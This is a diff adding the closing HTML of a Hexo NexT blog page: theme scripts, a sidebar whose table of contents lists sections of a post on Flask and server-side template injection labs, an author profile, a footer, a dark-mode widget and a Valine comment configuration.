+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+<iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width=330 height=86 src="//music.163.com/outchain/player?type=2&id=478507889&auto=1&height=66"></iframe>
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#Python-Flask%E6%A1%86%E6%9E%B6%E5%AD%A6%E4%B9%A0"><span class="nav-number">1.</span> <span class="nav-text">Python Flask框架学习</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%AE%89%E8%A3%85"><span class="nav-number">1.1.</span> <span class="nav-text">安装</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#test"><span class="nav-number">1.2.</span> <span class="nav-text">test</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%BD%BF%E7%94%A8HTML%E6%A8%A1%E6%9D%BF"><span class="nav-number">1.3.</span> <span class="nav-text">使用HTML模板</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%BD%BF%E7%94%A8%E8%A1%A8%E5%8D%95"><span class="nav-number">1.4.</span> <span class="nav-text">使用表单</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%95%B0%E6%8D%AE%E5%BA%93%E9%9B%86%E6%88%90%EF%BC%9A%E4%BD%BF%E7%94%A8SQLAlchemy"><span class="nav-number">1.5.</span> <span class="nav-text">数据库集成：使用SQLAlchemy</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%AE%89%E8%A3%85-1"><span class="nav-number">1.5.1.</span> <span class="nav-text">安装</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%BD%BF%E7%94%A8-%E6%9C%80%E5%9F%BA%E7%A1%80%E7%89%88%F0%9F%9A%AC%F0%9F%9A%AC"><span class="nav-number">1.5.2.</span> <span class="nav-text">使用(最基础版🚬🚬)</span></a></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%88%AB%E7%9A%84%E6%A8%A1%E6%9D%BF"><span class="nav-number">2.</span> <span class="nav-text">别的模板</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#sstilabs"><span class="nav-number">3.</span> <span class="nav-text">sstilabs</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%AE%89%E8%A3%85-2"><span class="nav-number">3.1.</span> <span class="nav-text">安装</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#level1"><span class="nav-number">3.2.</span> <span class="nav-text">level1</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#level2"><span class="nav-number">3.3.</span> <span class="nav-text">level2</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#level3"><span class="nav-number">3.4.</span> <span class="nav-text">level3</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#level4"><span class="nav-number">3.5.</span> <span class="nav-text">level4</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#level5"><span class="nav-number">3.6.</span> <span class="nav-text">level5</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#level6"><span class="nav-number">3.7.</span> <span class="nav-text">level6</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#level7"><span class="nav-number">3.8.</span> <span class="nav-text">level7</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#level8"><span class="nav-number">3.9.</span> <span class="nav-text">level8</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#level9"><span class="nav-number">3.10.</span> <span class="nav-text">level9</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#level10"><span class="nav-number">3.11.</span> <span class="nav-text">level10</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#level11-13"><span class="nav-number">3.12.</span> <span class="nav-text">level11-13</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%BF%87%E6%BB%A4%E4%B8%8B%E5%88%92%E7%BA%BF-x2F-%E7%A9%BA%E6%A0%BC"><span class="nav-number">3.12.1.</span> <span class="nav-text">过滤下划线&#x2F;空格</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#attr-%E5%86%85%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%9E%84%E9%80%A0"><span class="nav-number">3.12.2.</span> <span class="nav-text">attr()内字符串构造</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%9E%84%E9%80%A0%E7%B1%BB"><span class="nav-number">3.12.3.</span> <span class="nav-text">构造类</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%9E%84%E9%80%A0%E6%96%B9%E6%B3%95"><span class="nav-number">3.12.4.</span> <span class="nav-text">构造方法</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%AE%8C%E6%95%B4%E5%88%A9%E7%94%A8%E8%AF%AD%E6%B3%95"><span class="nav-number">3.12.5.</span> <span class="nav-text">完整利用语法</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%90%88%E8%B5%B7%E6%9D%A5"><span class="nav-number">3.12.6.</span> <span class="nav-text">合起来</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#level11"><span class="nav-number">3.12.6.1.</span> <span class="nav-text">level11</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#level12-13"><span class="nav-number">3.12.6.1.1.</span> <span class="nav-text">level12,13</span></a></li></ol></li></ol></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#portswigger%E7%9A%84Server-side-template-injection%E6%A8%A1%E5%9D%97"><span class="nav-number">4.</span> <span class="nav-text">portswigger的Server-side template injection模块</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#Basic-server-side-template-injection"><span class="nav-number">4.1.</span> <span class="nav-text">Basic server-side template injection</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Basic-server-side-template-injection-code-context-%E5%85%A8%E6%98%AF%E5%BA%9F%E8%AF%9D%E4%B8%8E%E9%A2%98%E6%97%A0%E5%85%B3"><span class="nav-number">4.2.</span> <span class="nav-text">Basic server-side template injection (code context)(全是废话与题无关)</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Basic-server-side-template-injection-code-context"><span class="nav-number">4.3.</span> <span class="nav-text">Basic server-side template injection (code context)</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Server-side-template-injection-in-a-sandboxed-environment"><span class="nav-number">4.4.</span> <span class="nav-text">Server-side template injection in a sandboxed environment</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Server-side-template-injection-with-a-custom-exploit"><span class="nav-number">4.5.</span> <span class="nav-text">Server-side template injection with a custom exploit</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#ssti%E5%87%BA%E9%A2%98%E5%B0%9D%E8%AF%95"><span class="nav-number">5.</span> <span class="nav-text">ssti出题尝试</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%95%A5%E4%B8%8D%E7%9F%A5%E9%81%93%E6%9C%89%E6%B2%A1%E6%9C%89%E7%94%A8%E7%9A%84%E9%93%BE%E6%8E%A5%E5%A0%86%E5%A0%86"><span class="nav-number">6.</span> <span class="nav-text">啥不知道有没有用的链接堆堆</span></a></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="林涂"
+      src="/images/header.jpg">
+  <p class="site-author-name" itemprop="name">林涂</p>
+  <div class="site-description" itemprop="description">学习ing</div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">17</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/categories/">
+          
+        <span class="site-state-item-count">2</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/tags/">
+          
+        <span class="site-state-item-count">4</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author motion-element">
+      <span class="links-of-author-item">
+        <a href="https://github.com/LinTurrr" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;LinTurrr" rel="noopener" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
+      </span>
+  </div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2023</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">林涂</span>
+</div>
+
+        
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/pisces.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+  
+<script src="/js/local-search.js"></script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+<script src="https://unpkg.com/darkmode-js@1.5.7/lib/darkmode-js.min.js"></script>
+
+<script>
+var options = {
+  bottom: '64px',
+  right: 'unset',
+  left: '32px',
+  time: '0.5s',
+  mixColor: 'transparent',
+  backgroundColor: 'transparent',
+  buttonColorDark: '#100f2c',
+  buttonColorLight: '#fff',
+  saveInCookies: true,
+  label: '🌓',
+  autoMatchOsTheme: true
+}
+const darkmode = new Darkmode(options);
+window.darkmode = darkmode;
+darkmode.showWidget();
+</script>
+
+
+<script>
+NexT.utils.loadComments(document.querySelector('#valine-comments'), () => {
+  NexT.utils.getScript('//unpkg.com/valine/dist/Valine.min.js', () => {
+    var GUEST = ['nick', 'mail', 'link'];
+    var guest = 'nick,mail,link';
+    guest = guest.split(',').filter(item => {
+      return GUEST.includes(item);
+    });
+    new Valine({
+      el         : '#valine-comments',
+      verify     : false,
+      notify     : true,
+      appId      : 'YVmWHQrHLOAW7ewgX1jprtQl-gzGzoHsz',
+      appKey     : 'dY6y287UlOydRGZnN74I8XyY',
+      placeholder: "输入你的评论\\n昵称为必填项目",
+      avatar     : 'mm',
+      meta       : guest,
+      pageSize   : '3' || 10,
+      visitor    : true,
+      lang       : 'zh-cn' || 'zh-cn',
+      path       : location.pathname,
+      recordIP   : true,
+      serverURLs : ''
+    });
+  }, window.Valine);
+});
+</script>
+
+</body>
+</html>
